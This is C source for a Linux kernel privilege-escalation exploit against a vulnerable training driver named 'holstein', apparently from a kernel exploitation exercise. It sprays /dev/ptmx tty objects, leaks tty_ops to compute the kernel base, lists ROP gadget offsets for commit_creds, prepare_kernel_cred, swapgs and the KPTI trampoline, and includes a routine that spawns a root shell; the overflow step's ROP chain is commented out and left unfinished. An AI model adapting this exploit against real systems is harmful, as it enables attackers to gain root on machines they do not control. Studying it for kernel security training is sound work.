#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>

unsigned long kbase;

unsigned long pop_rdi_ret = 0x27bbdc; // 0xffffffff8127bbdc
unsigned long rop_iretq = 0x0202af; // 0xffffffff810202af found using: objdump -d vmlinux | grep iretq
unsigned long pop_rcx_ret = 0x2ea083; // 0xffffffff812ea083
unsigned long pop_rdx_rcx_rbx_rbp_ret = 0x2e31f7;
unsigned long swapgs_ret = 0x60bf7e; //0xffffffff8160bf7e // Used for context switching between kernel mode and user mode
unsigned long mov_rdi_rax_rep = 0x60c96b; // 0xffffffff8160c96b // mov rdi, rax and then mov qword [rdi], [rsi] rcx times. (put 0 in rcx to cancel ;-))
unsigned long find_task_by_vpid = 0x68d40; // 0xffffffff81068d40
unsigned long prepare_kernel_cred = 0x6e240; //0xffffffff8106e240
unsigned long commit_creds = 0x06e390; // 0xffffffff8106e390
unsigned long rop_kpti_trampoline = 0x800e26; // 0xffffffff81800e26

int global_fd;

void fatal(const char *msg) {
  perror(msg);
  exit(1);
}

void open_dev(char *name){
  char devname[100] = "/dev/";
  strcat(devname, name);
  global_fd = open(devname, O_RDWR);
	if (global_fd < 0){
		puts("[!] Failed to open device");
		exit(-1);
	} else {
    puts("[*] Opened device");
    }
}

unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[*] Saved state");
}

void get_shell(void){
    puts("[*] Returned to userland");
    if (getuid() == 0){
        printf("[*] UID: %d, got root!\n", getuid());
        system("/bin/sh");
    } else {
        printf("[!] UID: %d, didn't get root\n", getuid());
        exit(-1);
    }
}

unsigned long shell_addr = (unsigned long)get_shell;

void my_jump(void) { // needed because of stack alignment
    __asm__(
        ".intel_syntax noprefix;"
        "mov rax, shell_addr;"
        "push rax;"
        "ret;"
        ".att_syntax;"
    );
}

unsigned long user_rip = (unsigned long)my_jump;

void leak(){
    char buf[0x500];
    memset(buf, 'A', 0x500);

    read(global_fd, buf, 0x500);
    unsigned long leak_tty_ops = *(unsigned long*)&buf[0x418];
    printf("[*] leak tty_ops: 0x%lx\n", leak_tty_ops);
    kbase = leak_tty_ops - 0xc38880;
    printf("[*] Kbase: 0x%lx\n", kbase);
    
    // Address of g_buf
    unsigned long g_buf = *(unsigned long*)&buf[0x438] - 0x438; 
    printf("[*] g_buf: 0x%lx\n", g_buf);
    
}


void overflow() {
    /*
    char buf[0x500];
    memset(buf, 'A', 0x408);
    unsigned long *chain = (unsigned long)&buf[0x408];
    write(global_fd, buf, (void*)chain - (void*)buf); // since chain has been incremeneted
    */
    char buf[0x500];
    memset(buf, 'A', 0x500);
    write(global_fd, buf, 0x500);
    getchar();
}



int main() {
    int spray[100];

    printf("[*] Save state\n");
    save_state();

    printf("[*] Spraying first 50 tty\n");
    for (int i = 0; i < 50; i++) {
        spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
        if (spray[i] == -1) {
            fatal("/dev/ptmx");
        }
    }

    printf("[*] Open dev\n");
    open_dev("holstein");

    printf("[*] Spraying last 50 tty\n");
    for (int i = 50; i < 100; i++) {
        spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
        if (spray[i] == -1) {
            fatal("/dev/ptmx");
        }
    }

    printf("[*] Leak\n");
    leak();

    printf("[*] Overflow\n");
    overflow();

    close(global_fd);
    puts("[!] end of main");

    return 0;
  }